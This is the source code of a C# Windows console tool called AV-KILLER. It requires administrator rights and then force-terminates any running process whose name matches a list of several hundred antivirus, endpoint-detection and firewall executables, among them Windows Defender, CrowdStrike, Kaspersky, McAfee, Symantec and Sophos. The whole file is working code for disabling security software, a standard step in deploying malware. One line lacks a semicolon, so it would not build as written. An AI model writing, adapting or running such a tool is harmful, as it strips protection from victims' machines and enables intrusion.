﻿using System;
using System.Diagnostics;
using System.Security.Principal;


namespace AvKiller
{
    class Program
    {
        private static int count_of_kill = 0;
        static void Main(string[] args)
        {
            Console.BackgroundColor = ConsoleColor.Red;
            Console.ForegroundColor = ConsoleColor.White;
            Console.Title = "AV-KILLER by k3rnel-dev [ https://github.com/k3rnel-dev ]";
            Console.WriteLine(printBanner());


            if (isAdmin())
            {
                Killer();
            } else
            {
                Console.WriteLine("[!] Need a administration privileges!");
            }
            Console.WriteLine("[!] Press enter to Exit . . .");
            Console.ReadLine();



        }


        static bool isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static string printBanner()
        {
            string banner = @"
            <!-- >>===========================================================<< -->
            <!-- ||                                                           || -->
            <!-- ||          ___   __   _  _____ _    _    ___ ___            || -->
            <!-- ||         /_\ \ / /__| |/ /_ _| |  | |  | __| _ \           || -->
            <!-- ||        / _ \ V /___| ' < | || |__| |__| _||   /           || -->
            <!-- ||  _____/_/_\_\_/ ___|_|\_\___|____|____|___|_|_\_____   __ || -->
            <!-- || | _ ) \ / / | |/ / __| _ \ \| | __| |    |   \| __\ \ / / || -->
            <!-- || | _ \\ V /  | ' <| _||   / .` | _|| |__  | |) | _| \ V /  || -->
            <!-- || |___/ |_|   |_|\_\___|_|_\_|\_|___|____| |___/|___| \_/   || -->
            <!-- ||             https://github.com/k3rnel-dev                 || -->
            <!-- >>===========================================================<< -->
";
            return banner;
        }

        static void Killer()
        {
            string[] processesToKill = new string[]
                {
                "paamsrv",
                "psh_svc",
                "aupdrun",
                "ACAAS",
                "ACAEGMgr",
                "acaif",
                "ACAIS",
                "ahnsd",
                "ahnsdsv",
                "autoup",
                "v3clnsrv",
                "V3Medic",
                "V3Svc",
                "aflogvw",
                "ahnrpt",
                "atwsctsk",
                "v3exec",
                "v3imscn",
                "V3LITE",
                "V3MAIN",
                "V3SP",
                "monsvcnt",
                "monsysnt",
                "AeXNSRcvSvc",
                "aexsvc",
                "AtrsHost",
                "CTDataLoad",
                "AeXAgentUIHost",
                "aexnsagent",
                "AeXNSAgent",
                "AClntUsr",
                "aexswdusr",
                "PXEMTFTP",
                "aclient",
                "securitycenter",
                "starta",
                "stopa",
                "AnVir",
                "csrss_tc",
                "ashAvast",
                "ashBug",
                "ashChest",
                "ashCmd",
                "ashdisp",
                "ashDisp",
                "ashEnhcd",
                "ashLogV",
                "ashmaisv",
                "ashMaiSv",
                "ashPopWz",
                "ashQuick",
                "ashserv",
                "ashServ",
                "ashSimp2",
                "ashSimpl",
                "ashSkPcc",
                "ashSkPck",
                "ashUpd",
                "ashwebsv",
                "ashWebSv",
                "aswDisp",
                "aswRegSvr",
                "aswServ",
                "aswupdsv",
                "aswUpdsv",
                "aswUpdSv",
                "aswWebSv",
                "AvastSvc",
                "avEngine",
                "afwServ",
                "AvastUI",
                "avastemupdate",
                "unsecapp",
                "avgamsvr",
                "avgas",
                "avgcc32",
                "avgcc",
                "avgctrl",
                "avgdiag",
                "avgemc",
                "avgfws8",
                "avgfwsrv",
                "avginet",
                "avgmsvr",
                "avgrssvc",
                "avgscanx",
                "avgserv9",
                "avgserv",
                "avgupd",
                "avgupdln",
                "avgupsvc",
                "avgvv",
                "avgwb.dat",
                "avgw",
                "avgwizfw",
                "guard",
                "avgcsrvx",
                "AVGIDSAgent",
                "AVGIDSMonitor",
                "AVGIDSUI",
                "AVGIDSWatcher",
                "avgam",
                "avgnsx",
                "avgfws9",
                "avgrsx",
                "avgtray",
                "avgwdsvc",
                "sidebar",
                "AVGCHSVX",
                "AVGCSRVX",
                "AVGNSX",
                "AVGSVC",
                "AVGUI",
                "avgcmgr",
                "avgemcx",
                "avgfws",
                "avgmfapx",
                "avgcefrend",
                "avgcsrva",
                "avgemca",
                "avgnsa",
                "avgrsa",
                "loggingserver",
                "toolbarupdater",
                "wtusystemsuport",
                "avgregcl",
                "avgsystx",
                "vprot",
                "avcenter",
                "avconfig",
                "avesvc",
                "avgnt",
                "avmailc",
                "avmcdlg",
                "avnotify",
                "avscan",
                "avshadow",
                "guardgui",
                "avguard",
                "avadmin",
                "avfwsvc",
                "avwebgrd",
                "fwinst",
                "SysOptEngineSvc",
                "BavTray",
                "Bhipssvc",
                "bmrt",
                "seccenter",
                "gziface",
                "gzserv",
                "bdagent",
                "bdc",
                "bdlite",
                "bdmcon",
                "bdss",
                "bdsubmit",
                "deloeminfs",
                "livesrv",
                "setloadorder",
                "vsserv",
                "xcommsvr",
                "bka",
                "BkavSystemServer",
                "BluPro",
                "blackd",
                "blackice",
                "ProUtil",
                "rapapp",
                "RapApp",
                "BLACKD",
                "basfipm",
                "BULLGUARDBHVSCANNER",
                "BULLGUARDSCANNER",
                "BULLGUARD",
                "BULLGUARDTRAY",
                "BULLGUARDUPDATE",
                "isafe",
                "cavrid",
                "vetmsg",
                "amswmagt",
                "caf",
                "capmuamagt",
                "ccnfagent",
                "ccsmagtd",
                "cfftplugin",
                "cfnotsrvd",
                "cfsmsmd",
                "ALERT",
                "igateway",
                "inotask",
                "InoTask",
                "CAAntiSpyware",
                "caavcmdscan",
                "caav",
                "caavguiscan",
                "cafw",
                "CALogDump",
                "capfaem",
                "capfsem",
                "CAPPActiveProtection",
                "casecuritycenter",
                "caunst",
                "cavrep",
                "cctray",
                "ccupdate",
                "isafinst",
                "ITMRT_SupportDiagnostics",
                "ITMRTSVC",
                "ITMRT_TRACE",
                "PPClean",
                "UmxAgent",
                "UmxCfg",
                "UmxFwHlp",
                "UmxPol",
                "unvet32",
                "capfasem",
                "ccprovsp",
                "PPCtlPriv",
                "casc",
                "ccschedulersvc",
                "ccsystemreport",
                "inonmsrv",
                "InoNmSrv",
                "InoWeb",
                "Auth8021x",
                "krbcc32s",
                "pep",
                "realmon",
                "Realmon",
                "RealMon",
                "RepMgr64",
                "csacontrol",
                "leventmgr",
                "okclient",
                "clamscan",
                "ClamTray",
                "ClamWin",
                "ccemflsv",
                "cssauth",
                "cavscan",
                "CLPS",
                "CLPSLA",
                "CLPSLS",
                "cmdinstall",
                "cfpconfig",
                "cfp",
                "cfplogvw",
                "cfpsbmit",
                "cfpupdat",
                "cmdagent",
                "crashrep",
                "CIS",
                "CISTRAY",
                "cpf",
                "cfpconfg",
                "CSFalconService",
                "CylanceUI",
                "CylanceSvc",
                "CrAmTray",
                "CrsSvc",
                "AmSvc",
                "FrzState2k",
                "DRWAGNUI",
                "drweb32",
                "drweb32w",
                "DRWEB32W",
                "drweb386",
                "drwebcgp",
                "drwebdc",
                "drweb",
                "drwebmng",
                "drwebscd",
                "DRWEBSCD",
                "drwebupw",
                "DRWEBUPW",
                "drwebwcl",
                "drwebwin",
                "DRWINST",
                "dwengine",
                "spiderml",
                "SPIDERML",
                "spidernt",
                "SPIDERNT",
                "spiderui",
                "SpIDerAgent",
                "drwagntd",
                "DRWAGNTD",
                "drwupgrade",
                "drwebcom",
                "DWARKDAEMON",
                "DWNETFILTER",
                "spideragent",
                "eeyeevnt",
                "RetinaEngine",
                "A2GUARD",
                "A2SERVICE",
                "A2START",
                "Administrator",
                "control_panel",
                "usergate",
                "esmagent",
                "era",
                "ppmcativedetection",
                "vettray",
                "cavtray",
                "inorpc",
                "InoRpc",
                "inort",
                "InoRT",
                "ca",
                "caissdt",
                "etagent",
                "ETLogAnalyzer",
                "ETRssFeeds",
                "evtarmgr",
                "evtmgr",
                "ETReporter",
                "ETConsole3",
                "EtwControlPanel",
                "UserAnalysis",
                "ETCorrel",
                "evtProcessEcFile",
                "EtScheduler",
                "UserActivity",
                "TrapTrackerMgr",
                "ewidoctrl",
                "ewidoguard",
                "FCDBLog",
                "fmon",
                "fortifw",
                "FortiProxy",
                "FortiTray",
                "FortiWF",
                "update_task",
                "FCAPPDB",
                "FCDBLOG",
                "FCHELPER64",
                "FORTIESNAC",
                "FORTIPROXY",
                "FORTISSLVPNDAEMON",
                "FORTITRAY",
                "FORTIWF",
                "FPAVServer",
                "FProtTray",
                "fameh32",
                "fspex",
                "fsaa",
                "bwgo0000",
                "fch32",
                "fih32",
                "FAMEH32",
                "FCH32",
                "fsaua",
                "fsav32",
                "fscuif",
                "FSCUIF",
                "fsdfwd",
                "fsgk32",
                "fsgk32st",
                "fsguidll",
                "fsguiexe",
                "fshdll32",
                "FSHDLL32",
                "FSHOSTER32",
                "FSHOSTER64",
                "fsm32",
                "FSM32",
                "fsma32",
                "FSMA32",
                "fsmb32",
                "FSMB32",
                "fsorsp",
                "fspc",
                "fsqh",
                "fssm32",
                "setupguimngr",
                "SetupGUIMngr",
                "tnbutil",
                "fsavgui",
                "GDScan",
                "AVKProxy",
                "AVKService",
                "AVKTray",
                "AVKWCtl",
                "GDFirewallTray",
                "GDFwSvc",
                "EndPointSecurity",
                "esecservice",
                "gfireporterservice",
                "esecagntservice",
                "rcsvcmon",
                "DolphinCharge.e",
                "DolphinCharge",
                "LogGetor",
                "netalertclient",
                "PrintDevice",
                "PwdFiltHelp",
                "pthosttr",
                "hpqWmiEx",
                "ntcaagent",
                "ntcadaemon",
                "ntcaservice",
                "PrivacyIconClient",
                "rapuisvc",
                "vpatch",
                "tclproc",
                "isscsf",
                "issCSF",
                "issdaemon",
                "issDaemon",
                "kvdetech",
                "kvmonxp_2.kxp",
                "KVMonXP_2.kxp",
                "kvmonxp.kxp",
                "KVMonXP.kxp",
                "kvolself",
                "kvsrvxp_1",
                "kvsrvxp",
                "KVSrvXP",
                "kvxp.kxp",
                "KvXP.kxp",
                "PpPpWallRun",
                "avpcc",
                "avpexec",
                "avp",
                "AVP",
                "AVP",
                "avpm",
                "AvpM",
                "avpncc",
                "avps",
                "avpupd",
                "kav",
                "kavisarv",
                "kavmm",
                "kavss",
                "kavsvc",
                "kis",
                "klnagent",
                "KLNAGENT",
                "klswd",
                "klwtblfs",
                "kwsprod",
                "KWSProd",
                "AVPUI",
                "Up2date",
                "klserver",
                "oespamtest",
                "KavAdapterExe",
                "kavlotsingleton",
                "kavfsgt",
                "kavfsrcn",
                "kavfs",
                "KAVFS",
                "kavfswp",
                "kavshell",
                "klnacserver",
                "AVPDTAgt",
                "netcfg",
                "kavfsscs",
                "kavtray",
                "persfw",
                "avserver",
                "winroute",
                "WinRoute",
                "wrctrl",
                "KABackReport",
                "kaccore",
                "KANMCMain",
                "kastray",
                "kislive",
                "kmailmon",
                "KMailMon",
                "KNUpdateMain",
                "KSWebShield",
                "kxeserv",
                "uplive",
                "kansgui",
                "kansvr",
                "kavstart",
                "KAVStart",
                "kpfwsvc",
                "KPFWSvc",
                "kwatch",
                "KWatch",
                "kav32",
                "kissvc",
                "kpfw32",
                "system",
                "wssfcmai",
                "aawservice",
                "Ad-Aware2007",
                "nlsvc",
                "MBAMSERVICE",
                "MBAMTRAY",
                "engineserver",
                "EngineServer",
                "EventParser",
                "log_qtine",
                "mfeann",
                "NAIlgpip",
                "RPCServ",
                "srvmon",
                "mcagent",
                "mfemactl",
                "macmnsvc",
                "masvc",
                "masalert",
                "msssrv",
                "massrv",
                "msscli",
                "mcshld9x",
                "mgavrtcl",
                "mcappins",
                "mfecanary",
                "macompatsvc",
                "mcvsrte",
                "mfefire",
                "DAO_Log",
                "firesvc",
                "FireSvc",
                "FireTray",
                "firetray",
                "MCAPEXE",
                "MCSACORE",
                "MCSVHOST",
                "mfeesp",
                "naprdmgr",
                "naPrdMgr",
                "cpd",
                "mfefw",
                "FrameworkServic",
                "cmgrdian",
                "mcshell",
                "mfehcs",
                "mcinfo",
                "HWAPI",
                "McAfeeDataBackup",
                "mcmscsvc",
                "McNASvc",
                "mcods",
                "mcpromgr",
                "McProxy",
                "mcuimgr",
                "MpfSrv",
                "mpsevh",
                "mps",
                "msksrver",
                "RedirSvc",
                "SAService",
                "siteadv",
                "SiteAdv",
                "mfemms",
                "neotrace",
                "vshwin32",
                "mpfagent",
                "MpfAgent",
                "mpfconsole",
                "mpf",
                "mpfservice",
                "mpftray",
                "mscifapp",
                "mfevtps",
                "qclean",
                "mcregwiz",
                "RSSensor",
                "SAFeService",
                "NCDaemon",
                "mcdash",
                "mcdetect",
                "SSScheduler",
                "saHookMain",
                "mskdetct",
                "msksrvr",
                "mskagent",
                "stinger",
                "mcsysmon",
                "mctskshd",
                "mfetp",
                "myagttry",
                "mcupdmgr",
                "rulaunch",
                "mcshield",
                "Mcshield",
                "MCSHIELD",
                "mcvsshld",
                "tbmon",
                "TBMon",
                "alogserv",
                "AlogServ",
                "mcmnhdlr",
                "mghtml",
                "edisk",
                "scan32",
                "frameworkservice",
                "FrameworkService",
                "mcconsol",
                "mcscript_inuse",
                "McScript_InUse",
                "Mctray",
                "mcupdate",
                "shstat",
                "UdaterUI",
                "updaterui",
                "UpdaterUI",
                "mcepoc",
                "McEPOC",
                "mcepocfg",
                "McEPOCfg",
                "mcpalmcfg",
                "mcwcecfg",
                "McWCECfg",
                "mcwce",
                "McWCE",
                "frameworkservic",
                "vsmain",
                "oasclnt",
                "vsstat",
                "VsStat",
                "VSStat",
                "mcvsftsn",
                "avconsol",
                "Avconsol",
                "avsynmgr",
                "Avsynmgr",
                "vstskmgr",
                "VsTskMgr",
                "webscanx",
                "WebScanX",
                "mfewc",
                "mfewch",
                "giantantispywaremain",
                "giantantispywareupdater",
                "gcasservalert",
                "gcascleaner",
                "gcasinstallhelper",
                "gcasnotice",
                "gcasdtserv",
                "gcasserv",
                "gcasswupdater",
                "fcsms",
                "FcsMs",
                "fcssas",
                "FcsSas",
                "nissrv",
                "DPMRA",
                "msseces",
                "wscntfy",
                "SecurityManager",
                "AESecurityService",
                "Deteqt.Agent",
                "OmniAgent",
                "nerosvc",
                "SeAnalyzerTool",
                "SpyEmergency",
                "SpyEmergencySrv",
                "NLClient",
                "crdm",
                "NMAGENT",
                "egui",
                "EHttpSrv",
                "ekrn",
                "nod32",
                "nod32krn",
                "nod32kui",
                "NOD32view",
                "cclaw",
                "CClaw",
                "elogsvc",
                "nip",
                "Nip",
                "NIP",
                "nipsvc",
                "njeeves",
                "Njeeves",
                "NJeeves",
                "Npfmsg2",
                "npfmsg",
                "NPFMSG",
                "Npfsvice",
                "nrmenctb",
                "NRMENCTB",
                "nvcoas",
                "Nvcoas",
                "NVCOAS",
                "nvcsched",
                "Nvcsched",
                "NVCSched",
                "nymse",
                "Nymse",
                "zanda",
                "Zanda",
                "zlh",
                "Zlh",
                "ZLH",
                "NORTONSECURITY",
                "ixAptSvc",
                "ixAvSvc",
                "ixFwSvc",
                "EMLPROUI",
                "EMLPROXY",
                "mpsvc",
                "ONLINENT",
                "ONLNSVC",
                "SCANMSG",
                "SCANWSCS",
                "TSAnSrf",
                "TSAtiSy",
                "TScutyNT",
                "TSmpNT",
                "UPSCHD",
                "xfilter",
                "aps",
                "aus",
                "outpost",
                "AdminServer",
                "Avtask",
                "ClShield",
                "Console",
                "CPntSrv",
                "PadFSvr",
                "PASystemTray",
                "PavFnSvr",
                "Pavkre",
                "PavProt",
                "PavReport",
                "PNmSrv",
                "PSIMSVC",
                "pavupg",
                "remupd",
                "avengine",
                "iface",
                "pavfires",
                "pavkre",
                "pavmail",
                "pavprot",
                "pavprsrv",
                "pavsched",
                "pavsrv50",
                "pavsrv51",
                "pavsrv52",
                "prevsrv",
                "psimsvc",
                "tpsrv",
                "pagent",
                "Pagent",
                "pagentwd",
                "Pagentwd",
                "psctris",
                "apvxdwin",
                "AVENGINE",
                "inicio",
                "pavbckpt",
                "PavBckPT",
                "pavfnsvr",
                "PAVFNSVR",
                "pavjobs",
                "PavPrSrv",
                "PAVSRV51",
                "PSANHOST",
                "PsCtrlS",
                "PSHost",
                "psimreal",
                "PsImSvc",
                "pskmssvc",
                "PSUAMAIN",
                "PSUASERVICE",
                "srvload",
                "webproxy",
                "WebProxy",
                "WEBPROXY",
                "pnmsrv",
                "avltmain",
                "FirewallGUI",
                "pviewer",
                "pview",
                "pmon",
                "qoeloader",
                "Qoeloader",
                "fws",
                "CCenter",
                "ravxp",
                "RavXP",
                "RAVXP",
                "rfwproxy",
                "rfwstub",
                "knownsvr",
                "ras",
                "rasupd",
                "upfile",
                "rstray",
                "RavAlert",
                "Rav",
                "ravmond",
                "RavMonD",
                "RAVMOND",
                "ravmon",
                "RavMon",
                "RavService",
                "ravstub",
                "RavStub",
                "RavTask",
                "RavTray",
                "RavUpdate",
                "RNReport",
                "rsnetsvr",
                "scanfrm",
                "rfwmain",
                "rfwsrv",
                "winlog",
                "OMSLogManager",
                "SnHwSrv",
                "SnICheckAdm",
                "SnicheckSrv",
                "SnIcon",
                "SnSrv",
                "smsx",
                "svcharge",
                "SVCharge",
                "svdealer",
                "SVDealer",
                "svframe",
                "SVFrame",
                "svtray",
                "SVTray",
                "sschk",
                "trjscan",
                "trupd",
                "SSecurityManager",
                "DLTray",
                "DLService",
                "DLTray",
                "ALMon",
                "lmon",
                "SAVAdminService",
                "savservice",
                "SavService",
                "SDRSERVICE",
                "SWC_SERVICE",
                "sweepsrv.sys",
                "SWI_SERVICE",
                "swnetsup",
                "SWNETSUP",
                "alsvc",
                "ALsvc",
                "ALUpdate",
                "SAVMain",
                "sav32cli",
                "CertificationManagerServiceNT",
                "EMLibUpdateAgentNT",
                "ManagementAgentNT",
                "MgntSvc",
                "RouterNT",
                "schdsrvc",
                "SSP",
                "SCFManager",
                "SCFService",
                "SCFTray",
                "op_viewer",
                "sgbhp",
                "pctsAuxs",
                "pctsGui",
                "pctsSvc",
                "pctsTray",
                "RegMech",
                "SDTrayApp",
                "svcntaux",
                "swdsvc",
                "swnxt",
                "execstat",
                "seestat",
                "swserver",
                "slee81",
                "kpf4gui",
                "kpf4ss",
                "WrSpySetup",
                "acctmgr",
                "AcctMgr",
                "alertsvc",
                "AlertSvc",
                "ALERTSVC",
                "alunotify",
                "ALUNotify",
                "aluschedulersvc",
                "AluSchedulerSvc",
                "AppSvc32",
                "ccap",
                "CCAP",
                "ccapp",
                "ccApp",
                "ccevtmgr",
                "ccEvtMgr",
                "ccproxy",
                "ccProxy",
                "ccpxysvc",
                "ccsetmgr",
                "ccSetmgr",
                "ccSetMgr",
                "ccSvcHst",
                "checkup",
                "cka",
                "comHost",
                "cpdclnt",
                "csinject",
                "csinsm32",
                "csinsmnt",
                "dbserv",
                "dbsrv9",
                "defwatch",
                "DefWatch",
                "Defwatch",
                "diskmon",
                "djsnetcn",
                "doscan",
                "dwhwizrd",
                "DWHWizrd",
                "FWCfg",
                "ghost_2",
                "ghosttray",
                "icepack",
                "IcePack",
                "IdsInst",
                "isPwdSvc",
                "issvc",
                "ISSVC",
                "isUAC",
                "luall",
                "LUALL",
                "LUALL",
                "lucallbackproxy",
                "lucoms~1",
                "lucoms",
                "MCUI32",
                "navapsvc",
                "Navapsvc",
                "NAVAPSVC",
                "navapw32",
                "NAVAPW32",
                "NaveCtrl",
                "NaveLog",
                "NaveSP",
                "NavShcom",
                "navw32",
                "Navw32",
                "Navwnt",
                "ndetect",
                "ngctw32",
                "ngserver",
                "nisoptui",
                "nisserv",
                "nisum",
                "nmain",
                "npfmntor",
                "nprotect",
                "NPROTECT",
                "npscheck",
                "npssvc",
                "nscsrvce",
                "nsctop",
                "NscTop",
                "nsmdtr",
                "NSMdtr",
                "olfsnt40",
                "OLFSNT40",
                "opscan",
                "poproxy",
                "POProxy",
                "POPROXY",
                "pqibrowser",
                "PQIBrowser",
                "pqv2isvc",
                "pxemtftp",
                "pxeservice",
                "qdcsfs",
                "qserver",
                "ReporterSvc",
                "rnav",
                "rtvscan",
                "Rtvscan",
                "RTVscan",
                "SAVFMSESp",
                "savroam",
                "SavRoam",
                "savscan",
                "SAVScan",
                "SavUI",
                "sbserv",
                "scanexplicit",
                "SemSvc",
                "SescLU",
                "SEVINST",
                "SmcGui",
                "SMSECtrl",
                "SMSELog",
                "SMSESJM",
                "smsesp",
                "SMSESp",
                "SMSESrv",
                "SMSETask",
                "SMSEUI",
                "sms",
                "sndmon",
                "SNDMon",
                "sndsrvc",
                "SNDSrvc",
                "spbbcsvc",
                "SPBBCSvc",
                "symlcsvc",
                "symproxysvc",
                "symsport",
                "SymSPort",
                "symtray",
                "symwsc",
                "sysdoc32",
                "UcService",
                "updtnv28",
                "urllstck",
                "UrlLstCk",
                "usrprmpt",
                "UsrPrmpt",
                "v2iconsole",
                "vpc32",
                "VPC32",
                "VPDN_LU",
                "vprosvc",
                "wfxctl32",
                "WFXCTL32",
                "wfxmod32",
                "WFXMOD32",
                "wfxsnt40",
                "WFXSNT40",
                "lucomserver",
                "SAVFMSELog",
                "SAVFMSESJM",
                "SAVFMSECTRL",
                "SAVFMSESpamStatsManager",
                "SAVFMSESrv",
                "SAVFMSETask",
                "SAVFMSEUI",
                "SNAC",
                "SNAC",
                "smc",
                "SSM",
                "reportsvc",
                "vptray",
                "VPTray",
                "procexp",
                "tdimon",
                "TFun",
                "TFGui",
                "TFService",
                "TFTray",
                "TIASPN~1",
                "Traflnsp",
                "asupport",
                "IsntSmtp",
                "nSMDemf",
                "nSMDmon",
                "nSMDreal",
                "nSMDsch",
                "ofcdog",
                "pccNT",
                "avp",
                "avast",
                "avg",
                "avira",
                "mcafee",
                "bgagent",
                "bitdefender",
                "kaspersky",
                "norton",
                "mse",
                "panda",
                "PccNTUpd",
                "pcctlcom",
                "PcCtlCom",
                "PcScnSrv",
                "schupd",
                "TmListen",
                "Tmntsrv",
                "tmpfw",
                "TmPfw",
                "tmproxy",
                "tmas",
                "",
                "EntityMain",
                "aphost",
                "LWDMServer",
                "mrf",
                "COREFRAMEWORKHOST",
                "CORESERVICESHELL",
                "UISEAGNT",
                "UIWATCHDOG",
                "ISNTSysMonitor",
                "CNTAoSMgr",
                "ntrtscan",
                "NTRtScan",
                "ofcpfwsvc",
                "dwwin",
                "patch",
                "pccclient",
                "pccguide",
                "pcclient",
                "pccnt",
                "pccntmon",
                "PccNTMon",
                "pccntupd",
                "pccpfw",
                "pcscan",
                "pntiomon",
                "pop3pack",
                "pop3trap",
                "scanmailoutlook",
                "ScanMailOutLook",
                "smoutlookpack",
                "smOutlookPack",
                "tmlisten",
                "tmntsrv",
                "webtrapnt",
                "OfcPfwSvc",
                "EUQMonitor",
                "SMEX_ActiveUpda",
                "SMEX_Master",
                "SMEX_RemoteConf",
                "SMEX_SystemWatc",
                "svcGenericHost",
                "spntsvc",
                "SpntSvc",
                "stopp",
                "StOPP",
                "stwatchdog",
                "StWatchDog",
                "USBGuard",
                "UploadRecord",
                "SBAMSvc",
                "vrvmail",
                "vrvmon",
                "vrvnet",
                "vrv",
                "WRSA",
                "NetworkAgent",
                "WebsenseControlService",
                "mpcmdrun",
                "MpCmdRun",
                "MSASCui",
                "MsMpEng",
                "msascui",
                "msmpeng",
                "MsPMSPSv",
                "kb891711",
                "ZavAux",
                "ZavCore",
                "zillya",
                "zlclient",
                "vsmon",
                "ForceField",
                "ISWMGR",
                "zapro",
                "zonealarm",
                "mantispm",
                };

            foreach (string processName in processesToKill)
            {
                KillProcessByName(processName);
            }

            if (count_of_kill > 0)
            {
                Console.WriteLine($"[+] Total Killed: {count_of_kill}");
            }
            else
            {
                Console.WriteLine($"[*] Nothing find process to kill in massive!");
            }
        }

        static void KillProcessByName(string name)
        {
            foreach (Process process in Process.GetProcessesByName(name))
            {
                try
                {
                    process.Kill();
                    process.Dispose();
                    count_of_kill++;
                }
                catch
                {
                    // Failed to kill process
                    Console.WriteLine($"[-] Failed to kill process: {process}")
                }
            }
        }
    }
}